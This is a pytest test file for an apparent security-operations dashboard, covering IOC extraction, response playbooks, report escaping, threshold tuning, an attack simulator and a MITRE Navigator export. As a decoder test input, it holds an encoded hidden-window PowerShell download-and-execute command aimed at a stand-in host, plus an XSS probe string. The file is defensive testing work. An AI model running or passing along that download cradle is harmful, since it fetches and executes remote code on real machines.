"""IOC extraction, response planning and reports, case-work storage, tuning
sweeps, the streaming simulator, and the Navigator export."""

import base64
import json
from datetime import datetime, timedelta

import pandas as pd
import pytest

from socdash import evaluation, live, navigator, pipeline, response, tuning
from socdash.detection import ioc, rule_engine
from socdash.response import report
from socdash.storage import db


def _enc(script: str) -> str:
    return base64.b64encode(script.encode("utf-16-le")).decode()


@pytest.fixture(scope="module")
def dataset(tmp_path_factory):
    path = tmp_path_factory.mktemp("v3") / "soc.db"
    pipeline.run_pipeline(db_path=path, days=4, scenario_count=12, campaign_count=1, seed=42, end=datetime(2026, 9, 6))
    conn = db.connect(path)
    frames = db.read_events(conn), db.read_alerts(conn), db.read_incidents(conn)
    conn.close()
    return frames


# --- IOCs -----------------------------------------------------------------

def test_decode_powershell_reads_utf16_base64():
    script = "IEX (New-Object Net.WebClient).DownloadString('http://bad.example.info/a.ps1')"
    assert ioc.decode_powershell(f"powershell.exe -nop -w hidden -enc {_enc(script)}") == script
    assert ioc.decode_powershell(f"powershell -EncodedCommand {_enc(script)}") == script
    assert ioc.decode_powershell("powershell.exe -File backup.ps1") is None
    assert ioc.decode_powershell(None) is None
    assert ioc.decode_powershell("powershell -enc " + "!" * 60) is None  # not base64: no match, no crash


def test_rare_domains_ignore_what_everyone_resolves():
    rows = [{"event_type": "dns", "domain": "office.example.com", "host": f"WKS-{i}"} for i in range(6)]
    rows.append({"event_type": "dns", "domain": "c2.example.info", "host": "WKS-1"})
    assert ioc.rare_domains(pd.DataFrame(rows)) == {"c2.example.info"}


def test_campaign_incident_yields_url_domain_and_ip(dataset):
    events, alerts, incidents = dataset
    campaign = incidents.iloc[0]
    members = alerts[alerts["incident_id"] == campaign["incident_id"]]
    iocs = ioc.incident_iocs(members, events)
    assert {"url", "domain", "ip"} <= set(iocs["type"])
    url = iocs.loc[iocs["type"] == "url", "value"].iloc[0]
    assert url.startswith("http") and url.endswith(".ps1")
    assert not iocs.duplicated(["type", "value"]).any()


# --- Response -------------------------------------------------------------

def test_every_playbook_step_renders():
    playbooks = response.load_playbooks()
    everything = {t: {"hosts": ["H1"], "users": ["u1"], "ips": ["203.0.113.9"]} for t in playbooks}
    steps = response.plan(everything, domains=["c2.example.info"], playbooks=playbooks)
    assert len(steps) == sum(len(v) for v in playbooks.values())
    assert all("{" not in s["action"] for s in steps)
    assert len({s["key"] for s in steps}) == len(steps)
    assert [response.PHASES.index(s["phase"]) for s in steps] == sorted(response.PHASES.index(s["phase"]) for s in steps)


def test_steps_are_scoped_to_their_own_techniques_entities():
    members = pd.DataFrame([
        {"mitre_technique": "T1595", "entities": {"hosts": ["DB-01", "DB-02"], "users": [], "ips": ["203.0.113.9"]}},
        {"mitre_technique": "T1059.001", "entities": {"hosts": ["WKS-0014"], "users": ["m.ray"], "ips": []}},
    ])
    steps = {s["key"]: s["action"] for s in response.plan(response.entities_by_technique(members))}
    assert "WKS-0014" in steps["T1059.001:isolate-host"]
    assert "DB-01" not in steps["T1059.001:isolate-host"]


def test_steps_needing_absent_entities_are_dropped():
    steps = response.plan({"T1110": {"hosts": ["VPN-GW-01"], "users": [], "ips": []}})
    assert steps == []  # every brute-force step needs an IP or an account


def test_report_escapes_and_marks_progress(dataset):
    events, alerts, incidents = dataset
    incident = incidents.iloc[0]
    members = alerts[alerts["incident_id"] == incident["incident_id"]]
    steps = response.plan(response.entities_by_technique(members))
    html = report.build(incident, members, ioc.incident_iocs(members, events), steps,
                        done={steps[0]["key"]}, notes="<script>alert(1)</script>")
    assert "<script>alert(1)</script>" not in html and "&lt;script&gt;" in html
    assert html.count("status done") == 1
    assert html.count("status open") == len(steps) - 1


# --- Case work storage ------------------------------------------------------

def test_notes_and_actions_roundtrip(tmp_path):
    conn = db.connect(tmp_path / "case.db")
    db.write_incidents(conn, [{
        "incident_id": "INC-1", "first_seen": datetime(2026, 1, 1), "last_seen": datetime(2026, 1, 1, 1),
        "title": "t", "severity": "high", "score": 6.0, "alert_count": 1, "tactics": [], "entities": {}, "sources": [],
    }])
    row = db.read_incidents(conn).iloc[0]
    assert row["notes"] == "" and row["actions_done"] == []
    db.update_incident_notes(conn, "INC-1", "isolated WKS-0014")
    db.update_incident_actions(conn, "INC-1", {"T1110:block-source", "T1021:review-logons"})
    row = db.read_incidents(conn).iloc[0]
    assert row["notes"] == "isolated WKS-0014"
    assert row["actions_done"] == ["T1021:review-logons", "T1110:block-source"]
    conn.close()


# --- Tuning ---------------------------------------------------------------

def test_brute_force_sweep_shows_both_failure_modes(dataset):
    events, _, _ = dataset
    sweep = tuning.sweep_rule(events, "brute_force").set_index("value")
    default = int(sweep.index[sweep["is_default"]][0])
    assert sweep.loc[default, "recall"] == 1.0
    assert sweep.loc[default, "false_positives"] == 0
    assert sweep.loc[1, "false_positives"] > 0      # one failure: every typo alerts
    assert sweep.loc[20, "recall"] < 1.0            # twenty: the attacks slip under
    assert sweep["recall"].is_monotonic_decreasing  # a stricter threshold never catches more


def test_alert_budget_is_cumulative(dataset):
    events, _, _ = dataset
    budget = tuning.alert_budget(events, max_k=60)
    assert list(budget["k"]) == list(range(1, len(budget) + 1))
    assert budget["instances_covered"].is_monotonic_increasing
    assert budget["true_positives"].is_monotonic_increasing
    assert budget["recall"].max() <= 1.0
    assert budget.iloc[0]["precision"] in (0.0, 1.0)


# --- Streaming ------------------------------------------------------------

def test_live_simulator_catches_attacks_without_repeat_alerts(dataset):
    events, _, _ = dataset
    model, high_cut = live.train_from_history(events)
    sim = live.LiveSimulator(datetime(2026, 10, 2, 6, 0), model=model, high_cut=high_cut,
                             attack_probability=0.2, seed=3)
    for _ in range(12 * 12):  # 12 simulated hours
        sim.step(5)
    injections = sim.injections_frame()
    assert len(injections) >= 10
    # Allow the last couple of hours' attacks to still be unfolding.
    settled = injections[injections["started"] < sim.clock - timedelta(hours=2)]
    assert settled["detected_at"].notna().all()
    assert (injections["minutes_to_detect"].dropna() >= 0).all()

    per_rule_and_attack = {}
    for alert in sim.alerts:
        if alert["source"] == "anomaly_isolation_forest":
            continue
        for scenario in sim._scenario_of(alert["event_ids"]):
            key = (alert["source"], scenario)
            per_rule_and_attack[key] = per_rule_and_attack.get(key, 0) + 1
    assert per_rule_and_attack and max(per_rule_and_attack.values()) == 1


def test_anomaly_alerts_only_appear_when_an_hour_closes(dataset):
    events, _, _ = dataset
    model, high_cut = live.train_from_history(events)
    sim = live.LiveSimulator(datetime(2026, 10, 2, 6, 0), model=model, high_cut=high_cut, attack_probability=0.3, seed=5)
    for _ in range(6 * 12):
        sim.step(5)
    anomalies = [a for a in sim.alerts if a["source"] == "anomaly_isolation_forest"]
    assert anomalies
    assert all(a["detected_at"].minute == 0 and a["detected_at"] >= a["ts"] + timedelta(hours=1) for a in anomalies)


# --- Navigator ------------------------------------------------------------

def test_navigator_layer_scores_recall(dataset):
    events, alerts, _ = dataset
    coverage = evaluation.evaluate(events, alerts, rule_engine.load_rules())["coverage"]
    layer = json.loads(navigator.layer_json(coverage))
    assert layer["domain"] == "enterprise-attack" and layer["versions"]["layer"] == "4.5"
    by_id = {t["techniqueID"]: t for t in layer["techniques"]}
    assert by_id["T1110"]["tactic"] == "credential-access"
    assert 0 <= by_id["T1110"]["score"] <= 100
    assert by_id["T1059"]["showSubtechniques"] is True  # parent expanded so T1059.001 is visible
    tested = coverage[coverage["injected"] > 0]
    for _, row in tested.iterrows():
        assert by_id[row["technique"]]["score"] == round(100 * row["caught"] / row["injected"])
